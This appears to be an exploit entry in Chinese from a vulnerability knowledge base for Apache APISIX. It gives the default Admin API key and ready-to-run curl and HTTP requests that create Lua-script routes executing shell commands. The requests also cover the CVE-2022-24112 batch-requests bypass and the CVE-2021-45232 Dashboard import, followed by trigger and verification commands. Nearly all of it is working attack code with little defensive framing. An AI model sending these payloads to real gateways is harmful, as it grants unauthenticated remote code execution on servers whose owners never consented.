---
id: APISIX-DEFAULT-KEY-RCE
title: Apache APISIX 默认密钥与Dashboard远程代码执行
product: apisix
vendor: Apache
version_affected: "< 3.0, Dashboard < 3.0"
severity: CRITICAL
tags: [rce, default_key, api_gateway, 云原生, 无需认证]
fingerprint: ["APISIX", "apisix", "/apisix/admin/", "/apisix/dashboard", "X-API-KEY"]
---

## 漏洞描述

Apache APISIX API网关使用默认Admin API密钥，攻击者可创建恶意路由实现RCE。Dashboard存在未授权RCE。

## 影响版本

- Apache APISIX < 3.0（默认Admin API密钥）
- APISIX Dashboard < 3.0（CVE-2021-45232未授权RCE）
- CVE-2022-24112（batch-requests SSRF）: APISIX < 2.13.0

## 前置条件

- 目标开放 9080 端口（数据面）和 9180 端口（Admin API）
- APISIX 使用默认 Admin API 密钥
- 无需认证凭据

## 利用步骤

### 默认 Admin API Key 利用

默认密钥: `edd1c9f034335f136f87ad84b625c8f1`

```bash
# 验证密钥有效
curl http://target:9180/apisix/admin/routes \
  -H "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1"
```

### 通过创建路由执行Lua代码 RCE

```http
PUT /apisix/admin/routes/rce HTTP/1.1
Host: target:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json

{
  "uri": "/rce",
  "script": "local handle = io.popen('id'); local result = handle:read('*a'); handle:close(); ngx.say(result)",
  "upstream": {
    "type": "roundrobin",
    "nodes": {"target:1980": 1}
  }
}
```

触发命令执行:
```bash
curl http://target:9080/rce
```

### CVE-2022-24112: batch-requests 插件 SSRF 绕过

```http
POST /apisix/batch-requests HTTP/1.1
Host: target:9080
Content-Type: application/json

{
  "pipeline": [{
    "method": "PUT",
    "path": "/apisix/admin/routes/index",
    "headers": {"X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1"},
    "body": "{\"uri\":\"/rce\",\"script\":\"os.execute('id')\"}"
  }]
}
```

### CVE-2021-45232: Dashboard 未授权RCE

```http
POST /apisix/admin/migrate/export HTTP/1.1
Host: target:9000
```

```http
POST /apisix/admin/migrate/import HTTP/1.1
Host: target:9000
Content-Type: multipart/form-data

<import malicious route config with Lua RCE>
```

## Payload

```bash
# 使用默认密钥创建Lua RCE路由
curl -X PUT "http://target:9180/apisix/admin/routes/rce" \
  -H "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1" \
  -H "Content-Type: application/json" \
  -d '{"uri":"/rce","script":"local handle=io.popen(\"id\");local result=handle:read(\"*a\");handle:close();ngx.say(result)","upstream":{"type":"roundrobin","nodes":{"127.0.0.1:1980":1}}}'

# 触发命令执行
curl http://target:9080/rce

# CVE-2022-24112: batch-requests绕过
curl -X POST "http://target:9080/apisix/batch-requests" \
  -H "Content-Type: application/json" \
  -d '{"pipeline":[{"method":"PUT","path":"/apisix/admin/routes/rce2","headers":{"X-API-KEY":"edd1c9f034335f136f87ad84b625c8f1"},"body":"{\"uri\":\"/rce2\",\"script\":\"local h=io.popen(\\\"id\\\");ngx.say(h:read(\\\"*a\\\"));h:close()\",\"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"127.0.0.1:1980\":1}}}"}]}'
```

## 验证方法

```bash
# 验证默认Admin API密钥有效
curl -s -o /dev/null -w "%{http_code}" "http://target:9180/apisix/admin/routes" \
  -H "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1"
# 返回200表示默认密钥有效，401表示已更换

# 验证RCE路由创建成功后命令执行
curl -s http://target:9080/rce
# 返回uid=xxx表示RCE成功
```

## 指纹确认

```bash
curl -s http://target:9080/ 
curl -s http://target:9180/apisix/admin/ -H "X-API-KEY: invalid" 
curl -s http://target:9000/ | grep -i "apisix\|dashboard"
```
